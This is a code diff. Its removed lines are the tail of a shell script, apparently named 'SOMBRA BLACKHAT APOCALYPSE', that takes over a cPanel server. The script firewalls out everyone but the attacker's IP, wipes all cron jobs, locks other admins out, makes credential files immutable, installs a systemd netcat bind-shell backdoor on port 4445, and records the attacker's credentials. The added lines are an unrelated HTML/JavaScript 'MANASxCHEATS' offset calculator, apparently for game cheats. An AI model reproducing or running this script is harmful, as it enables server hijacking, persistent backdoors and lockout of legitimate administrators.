-        iptables -A INPUT -p tcp --dport $port -j DROP
-    done
-    iptables-save > /etc/iptables/rules.v4 2>/dev/null
+        <!-- Matrix grid -->
+        <div class="matrix-bg"></div>
 
-    # Remove cron jobs
-    for user in $(cut -d: -f1 /etc/passwd); do
-        crontab -r -u $user 2>/dev/null
-    done
-    rm -f /etc/cron.d/* 2>/dev/null
+        <!-- Particle canvas -->
+        <canvas id="particleCanvas"></canvas>
 
-    # Immutable files
-    chattr +i /etc/passwd /etc/shadow /etc/sudoers /usr/local/cpanel/scripts/password_reset 2>/dev/null
+        <!-- ─── TITLE BAR ─── -->
+        <header class="titlebar" id="titlebar">
+            <div class="brand">
+                <div class="logo">M</div>
+                <span class="name"><span class="highlight">MANAS</span>xCHEATS</span>
+            </div>
+            <div class="spacer"></div>
+            <span class="clock" id="clock">00:00:00</span>
+            <button class="theme-toggle" id="themeToggle" aria-label="Toggle theme">
+                <span class="icon icon-moon">☽</span>
+                <span class="icon icon-sun">☀</span>
+            </button>
+        </header>
 
-    # ---- PERSISTENCE via systemd ----
-    cat > /etc/systemd/system/sombra_backdoor.service << EOF
-[Unit]
-Description=SOMBRA Backdoor
-After=network.target
+        <!-- ─── HEADER ─── -->
+        <div class="header">
+            <h1>// <span class="accent">COLLIDER</span> FINDER</h1>
+            <div class="sub">encoder · decoder · offset engine</div>
+        </div>
 
-[Service]
-Type=simple
-ExecStart=/bin/bash -c 'while true; do nc -l -p 4445 -e /bin/bash; done'
-Restart=always
+        <!-- ─── CARDS ─── -->
+        <div class="cards" id="cardsContainer">
 
-[Install]
-WantedBy=multi-user.target
-EOF
-    systemctl enable sombra_backdoor.service
-    systemctl start sombra_backdoor.service
+            <!-- Card 1: Collider -->
+            <div class="card" id="card1">
+                <div class="card-title">⚡ Write Finder <span class="badge">v1</span></div>
+                <div class="divider"></div>
+                <div class="field-group">
+                    <label><span class="accent">▸</span> Collider Input</label>
+                    <input type="text" id="colliderInput" placeholder="0x8C, 0xA3..." spellcheck="false" />
+                </div>
+                <div class="field-group">
+                    <label><span class="accent">▸</span> Target Value</label>
+                    <input type="text" id="targetInput" placeholder="Enter value..." spellcheck="false" />
+                </div>
+                <button class="btn" id="btnCollider">Find</button>
+                <div class="result-box" id="result1">
+                    <span class="prefix">Result</span>
+                    <span class="value" id="val1">—</span>
+                    <button class="copy-btn" data-target="val1">Copy</button>
+                </div>
+            </div>
 
-    # ---- TOGGLE SCRIPTS ----
-    cat > /root/restore_admins.sh << 'RESTORE'
-#!/bin/bash
-BACKUP_DIR="/root/apocalypse"
-chattr -i /etc/passwd /etc/shadow /etc/sudoers
-cp $BACKUP_DIR/passwd.bak /etc/passwd
-cp $BACKUP_DIR/shadow.bak /etc/shadow
-cp $BACKUP_DIR/sudoers.bak /etc/sudoers
-for user in $(awk -F: '$7 == "/bin/false" {print $1}' /etc/passwd); do
-    if [ "$user" != "manas" ] && [ "$user" != "root" ]; then
-        usermod -s /bin/bash $user
-        passwd -u $user
-    fi
-done
-echo "Restore complete."
-RESTORE
-    chmod +x /root/restore_admins.sh
+            <!-- Card 2: Read Result -->
+            <div class="card" id="card2">
+                <div class="card-title">⟶ Basic → Ai Read <span class="badge">v2</span></div>
+                <div class="divider"></div>
+                <div class="field-group" style="margin-top:4px;">
+                    <label><span class="accent">▸</span> Read Value (Hex)</label>
+                    <input type="text" id="readInput" placeholder="0x8C" spellcheck="false" />
+                </div>
+                <button class="btn" id="btnRead" style="margin-top:12px;">Find</button>
+                <div class="result-box" id="result2">
+                    <span class="prefix">Result</span>
+                    <span class="value" id="val2">—</span>
+                    <button class="copy-btn" data-target="val2">Copy</button>
+                </div>
+            </div>
 
-    cat > /root/disable_again.sh << 'DISABLE'
-#!/bin/bash
-for user in $(awk -F: '$7 ~ /\/bin\/bash|\/bin\/sh/ {print $1}' /etc/passwd | grep -v root | grep -v manas); do
-    usermod -s /bin/false $user
-    passwd -l $user
-done
-chattr +i /usr/local/cpanel/scripts/password_reset 2>/dev/null
-iptables -F
-iptables -A INPUT -s $YOUR_IP -j ACCEPT
-for port in 22 2082 2083 2086 2087 2095 2096 21 25 465 587; do
-    iptables -A INPUT -p tcp --dport $port -s $YOUR_IP -j ACCEPT
-    iptables -A INPUT -p tcp --dport $port -j DROP
-done
-echo "Admins re-disabled."
-DISABLE
-    chmod +x /root/disable_again.sh
+            <!-- Card 3: Result Read -->
+            <div class="card" id="card3">
+                <div class="card-title">⟵ Ai → Basic Read <span class="badge">v3</span></div>
+                <div class="divider"></div>
+                <div class="field-group" style="margin-top:4px;">
+                    <label><span class="accent">▸</span> Result Value (Hex)</label>
+                    <input type="text" id="resultInput" placeholder="0xD4" spellcheck="false" />
+                </div>
+                <button class="btn" id="btnResult" style="margin-top:12px;">Find Read</button>
+                <div class="result-box" id="result3">
+                    <span class="prefix">Read</span>
+                    <span class="value" id="val3">—</span>
+                    <button class="copy-btn" data-target="val3">Copy</button>
+                </div>
+            </div>
 
-    cat > /root/toggle_check.sh << 'TOGGLE'
-#!/bin/bash
-if [ -f /tmp/enable_admins ]; then
-    /root/restore_admins.sh
-    rm -f /tmp/enable_admins
-fi
-if [ -f /tmp/disable_admins ]; then
-    /root/disable_again.sh
-    rm -f /tmp/disable_admins
-fi
-TOGGLE
-    chmod +x /root/toggle_check.sh
-    (crontab -l 2>/dev/null; echo "* * * * * /root/toggle_check.sh") | crontab -
+        </div>
 
-    # ---- SAVE CREDENTIALS ----
-    cat > $BACKUP_DIR/credentials_$DATE.txt << EOF
-=========================================
-SOMBRA BLACKHAT APOCALYPSE
-=========================================
-Admin user: $YOUR_USER
-Admin pass: $YOUR_PASS
-Your IP: $YOUR_IP
-SSH port: 22
-cPanel URL: https://$CPANEL_HOST:2083
-Backdoor port: 4445 (reverse shell)
-Systemd service: sombra_backdoor.service
-=========================================
-To enable others: touch /tmp/enable_admins
-To disable: touch /tmp/disable_admins
-Manual restore: /root/restore_admins.sh
-Manual disable: /root/disable_again.sh
-=========================================
-EOF
+        <!-- ─── STATUS BAR ─── -->
+        <footer class="statusbar">
+            <div class="dot"></div>
+            <span class="label"><span class="highlight">◆</span> MANASxCHEATS · collider engine <span class="highlight">◆</span></span>
+            <div class="status-spacer"></div>
+            <span class="version">v2.0 · stable</span>
+        </footer>
 
-    log "${GREEN}[✓] Lockdown complete. Persistence installed.${NC}"
-    log "${YELLOW}Admin: $YOUR_USER / $YOUR_PASS${NC}"
-    log "${BLUE}Toggle active. Backdoor listening on port 4445.${NC}"
-    log "${RED}All other admins locked out.${NC}"
-    read -p "Reboot now? (y/n): " -r
-    if [[ $REPLY =~ ^[Yy]$ ]]; then
-        shutdown -r now
-    fi
-else
-    log "${RED}[!] No credentials found. Apocalypse failed.${NC}"
-fi
+    </div>
 
-log "${GREEN}[✓] Blackhat Apocalypse finished.${NC}"
+    <script>
+        // ════════════════════════════════════════════════════════════════
+        // ── OFFSETS ───────────────────────────────────────────────────
+        // ════════════════════════════════════════════════════════════════
+
+        const OFFSETS = {
+            Player_Data: 0x48,
+            WeaponRecoil: 0x0C,
+            WeaponOnHand: 0x54,
+            Camera: 0x18
+        };
+
+        const PUSHPAGGG = OFFSETS.Player_Data + OFFSETS.WeaponRecoil; // 0x54
+        const BASE_OFFSET = OFFSETS.WeaponOnHand - OFFSETS.Camera + OFFSETS.WeaponRecoil; // 0x48
+
+        // ── Helpers ──────────────────────────────────────────────────
+
+        function parseHex(s) {
+            if (!s || typeof s !== 'string') return NaN;
+            let str = s.trim();
+            if (str.startsWith('0x') || str.startsWith('0X')) str = str.substring(2);
+            str = str.replace(/[,\s]/g, '');
+            if (str === '') return NaN;
+            const n = parseInt(str, 16);
+            return isNaN(n) ? NaN : n;
+        }
+
+        function toHex(n) {
+            return '0x' + n.toString(16).toUpperCase().padStart(2, '0');
+        }
+
+        function clamp(v, min, max) { return Math.max(min, Math.min(max, v)); }
+
+        function showToast(msg, duration) {
+            const el = document.getElementById('toast');
+            el.textContent = msg || '✔ Copied';
+            el.classList.add('show');
+            clearTimeout(el._hide);
+            el._hide = setTimeout(() => el.classList.remove('show'), duration || 1600);
+        }
+
+        function setResult(valueEl, resultBox, val, isValid) {
+            valueEl.textContent = isValid ? val : 'INVALID';
+            resultBox.classList.toggle('has-value', isValid && val !== '—' && val !== 'INVALID');
+            if (!isValid || val === '—' || val === 'INVALID') {
+                valueEl.style.color = '';
+            } else {
+                valueEl.style.color = '';
+            }
+        }
+
+        // ════════════════════════════════════════════════════════════════
+        // ── THEME TOGGLE ─────────────────────────────────────────────
+        // ════════════════════════════════════════════════════════════════
+
+        const app = document.getElementById('app');
+        const toggle = document.getElementById('themeToggle');
+
+        // Check stored preference or system
+        const stored = localStorage.getItem('theme');
+        if (stored) {
+            app.setAttribute('data-theme', stored);
+        } else if (window.matchMedia('(prefers-color-scheme: light)').matches) {
+            app.setAttribute('data-theme', 'light');
+        }
+
+        toggle.addEventListener('click', () => {
+            const current = app.getAttribute('data-theme');
+            const next = current === 'dark' ? 'light' : 'dark';
+            app.setAttribute('data-theme', next);
+            localStorage.setItem('theme', next);
+        });
+
+        // ════════════════════════════════════════════════════════════════
+        // ── PARTICLES ─────────────────────────────────────────────────
+        // ════════════════════════════════════════════════════════════════
+
+        const canvas = document.getElementById('particleCanvas');
+        const ctx = canvas.getContext('2d');
+        let W, H;
+
+        function resizeCanvas() {
+            const rect = document.getElementById('app').getBoundingClientRect();
+            W = canvas.width = rect.width;
+            H = canvas.height = rect.height;
+        }
+        resizeCanvas();
+        window.addEventListener('resize', resizeCanvas);
+
+        const PALETTE = ['#4a9eff', '#6ab0ff', '#2d7cdb', '#88c0ff'];
+        const NUM = 50;
+        let particles = [];
+
+        class Particle {
+            constructor() { this.reset(true); }
+            reset(init) {
+                this.x = Math.random() * W;
+                this.y = init ? Math.random() * H : H + 10;
+                this.vx = (Math.random() - 0.5) * 0.4;
+                this.vy = -(Math.random() * 0.5 + 0.08);
+                this.size = Math.random() * 1.6 + 0.4;
+                this.alpha = Math.random() * 0.4 + 0.1;
+                this.color = PALETTE[Math.floor(Math.random() * PALETTE.length)];
+                this.life = 0;
+                this.maxLife = 140 + Math.floor(Math.random() * 220);
+            }
+            update() {
+                this.x += this.vx;
+                this.y += this.vy;
+                this.life++;
+                this.alpha = 0.5 * Math.sin((this.life / this.maxLife) * Math.PI);
+                if (this.life >= this.maxLife || this.y < -10) this.reset(false);
+            }
+        }
+
+        for (let i = 0; i < NUM; i++) particles.push(new Particle());
+
+        function drawParticles() {
+            ctx.clearRect(0, 0, W, H);
+
+            // subtle grid
+            ctx.strokeStyle = 'rgba(74,158,255,0.02)';
+            ctx.lineWidth = 0.5;
+            for (let x = 0; x < W; x += 50) {
+                ctx.beginPath();
+                ctx.moveTo(x, 0);
+                ctx.lineTo(x, H);
+                ctx.stroke();
+            }
+            for (let y = 0; y < H; y += 50) {
+                ctx.beginPath();
+                ctx.moveTo(0, y);
+                ctx.lineTo(W, y);
+                ctx.stroke();
+            }
+
+            for (const p of particles) p.update();
+
+            // connections
+            for (let i = 0; i < particles.length; i++) {
+                for (let j = i + 1; j < particles.length; j++) {
+                    const dx = particles[i].x - particles[j].x;
+                    const dy = particles[i].y - particles[j].y;
+                    const d = Math.sqrt(dx * dx + dy * dy);
+                    if (d < 90) {
+                        const a = (1 - d / 90) * 12;
+                        ctx.strokeStyle = `rgba(74,158,255,${a/255})`;
+                        ctx.lineWidth = 0.5;
+                        ctx.beginPath();
+                        ctx.moveTo(particles[i].x, particles[i].y);
+                        ctx.lineTo(particles[j].x, particles[j].y);
+                        ctx.stroke();
+                    }
+                }
+            }
+
+            // dots
+            for (const p of particles) {
+                const a = clamp(Math.round(p.alpha * 255), 0, 255);
+                ctx.globalAlpha = a / 255;
+                ctx.fillStyle = p.color;
+                ctx.shadowColor = '#4a9eff';
+                ctx.shadowBlur = 6;
+                ctx.beginPath();
+                ctx.arc(p.x, p.y, p.size, 0, Math.PI * 2);
+                ctx.fill();
+            }
+            ctx.globalAlpha = 1;
+            ctx.shadowBlur = 0;
+
+            requestAnimationFrame(drawParticles);
+        }
+        drawParticles();
+
+        // ── Resize observer ──────────────────────────────────────────
+        const ro = new ResizeObserver(() => { resizeCanvas(); });
+        ro.observe(document.getElementById('app'));
+
+        // ════════════════════════════════════════════════════════════════
+        // ── CLOCK ─────────────────────────────────────────────────────
+        // ════════════════════════════════════════════════════════════════
+
+        function updateClock() {
+            const now = new Date();
+            document.getElementById('clock').textContent = now.toTimeString().slice(0, 8);
+        }
+        updateClock();
+        setInterval(updateClock, 1000);
+
+        // ════════════════════════════════════════════════════════════════
+        // ── CARD LOGIC ───────────────────────────────────────────────
+        // ════════════════════════════════════════════════════════════════
+
+        // Card 1
+        document.getElementById('btnCollider').addEventListener('click', () => {
+            const collider = parseHex(document.getElementById('colliderInput').value);
+            const target = parseHex(document.getElementById('targetInput').value);
+            const valEl = document.getElementById('val1');
+            const box = document.getElementById('result1');
+            if (isNaN(collider) || isNaN(target)) {
+                setResult(valEl, box, 'INVALID', false);
+                return;
+            }
+            const result = collider - target - PUSHPAGGG;
+            if (result < 0) {
+                setResult(valEl, box, 'INVALID', false);
+                return;
+            }
+            setResult(valEl, box, toHex(result), true);
+        });
+
+        // Card 2
+        document.getElementById('btnRead').addEventListener('click', () => {
+            const read = parseHex(document.getElementById('readInput').value);
+            const valEl = document.getElementById('val2');
+            const box = document.getElementById('result2');
+            if (isNaN(read)) {
+                setResult(valEl, box, 'INVALID', false);
+                return;
+            }
+            const result = read + BASE_OFFSET;
+            if (result <= 0) {
+                setResult(valEl, box, 'INVALID', false);
+                return;
+            }
+            setResult(valEl, box, toHex(result), true);
+        });
+
+        // Card 3
+        document.getElementById('btnResult').addEventListener('click', () => {
+            const res = parseHex(document.getElementById('resultInput').value);
+            const valEl = document.getElementById('val3');
+            const box = document.getElementById('result3');
+            if (isNaN(res)) {
+                setResult(valEl, box, 'INVALID', false);
+                return;
+            }
+            const read = res - BASE_OFFSET;
+            if (read < 0) {
+                setResult(valEl, box, 'INVALID', false);
+                return;
+            }
+            setResult(valEl, box, toHex(read), true);
+        });
+
+        // Enter key support
+        document.querySelectorAll('.card input').forEach(inp => {
+            inp.addEventListener('keydown', (e) => {
+                if (e.key === 'Enter') {
+                    const parent = inp.closest('.card');
+                    const btn = parent.querySelector('.btn');
+                    if (btn) btn.click();
+                }
+            });
+        });
+
+        // Copy buttons
+        document.querySelectorAll('.copy-btn').forEach(btn => {
+            btn.addEventListener('click', () => {
+                const targetId = btn.getAttribute('data-target');
+                const el = document.getElementById(targetId);
+                if (!el) return;
+                const text = el.textContent;
+                if (!text || text === '—' || text === 'INVALID') {
+                    showToast('⛔ Nothing to copy', 1200);
+                    return;
+                }
+                navigator.clipboard.writeText(text).then(() => {
+                    showToast('✔ ' + text, 1500);
+                }).catch(() => {
+                    const r = document.createRange();
+                    r.selectNode(el);
+                    window.getSelection().removeAllRanges();
+                    window.getSelection().addRange(r);
+                    document.execCommand('copy');
+                    window.getSelection().removeAllRanges();
+                    showToast('✔ Copied', 1500);
+                });
+            });
+        });
+
+        // Click result box to copy
+        document.querySelectorAll('.result-box').forEach(box => {
+            box.addEventListener('click', () => {
+                const valEl = box.querySelector('.value');
+                if (!valEl) return;
+                const text = valEl.textContent;
+                if (!text || text === '—' || text === 'INVALID') return;
+                navigator.clipboard.writeText(text).then(() => {
+                    showToast('✔ ' + text, 1500);
+                }).catch(() => {
+                    const r = document.createRange();
+                    r.selectNode(valEl);
+                    window.getSelection().removeAllRanges();
+                    window.getSelection().addRange(r);
+                    document.execCommand('copy');
+                    window.getSelection().removeAllRanges();
+                    showToast('✔ Copied', 1500);
+                });
+            });
+        });
+
+        // Auto-format hex on blur
+        document.querySelectorAll('.card input[type="text"]').forEach(inp => {
+            inp.addEventListener('blur', () => {
+                let v = inp.value.trim();
+                if (v.startsWith('0x') || v.startsWith('0X')) return;
+                const n = parseHex(v);
+                if (!isNaN(n)) inp.value = toHex(n);
+            });
+        });
+
+        // Pre-fill demo values
+        document.getElementById('colliderInput').value = '0x8C, 0xA3...';
+        document.getElementById('targetInput').value = 'Enter value...';
+        document.getElementById('readInput').value = '0x8C';
+        document.getElementById('resultInput').value = '0xD4';
+
+        console.log('🚀 MANASxCHEATS · COLLIDER ENGINE v2.0');
+        console.log(`PUSHPAGGG = ${toHex(PUSHPAGGG)} (${PUSHPAGGG})`);
+        console.log(`BASE_OFFSET = ${toHex(BASE_OFFSET)} (${BASE_OFFSET})`);
+    </script>
+
+</body>
+</html>
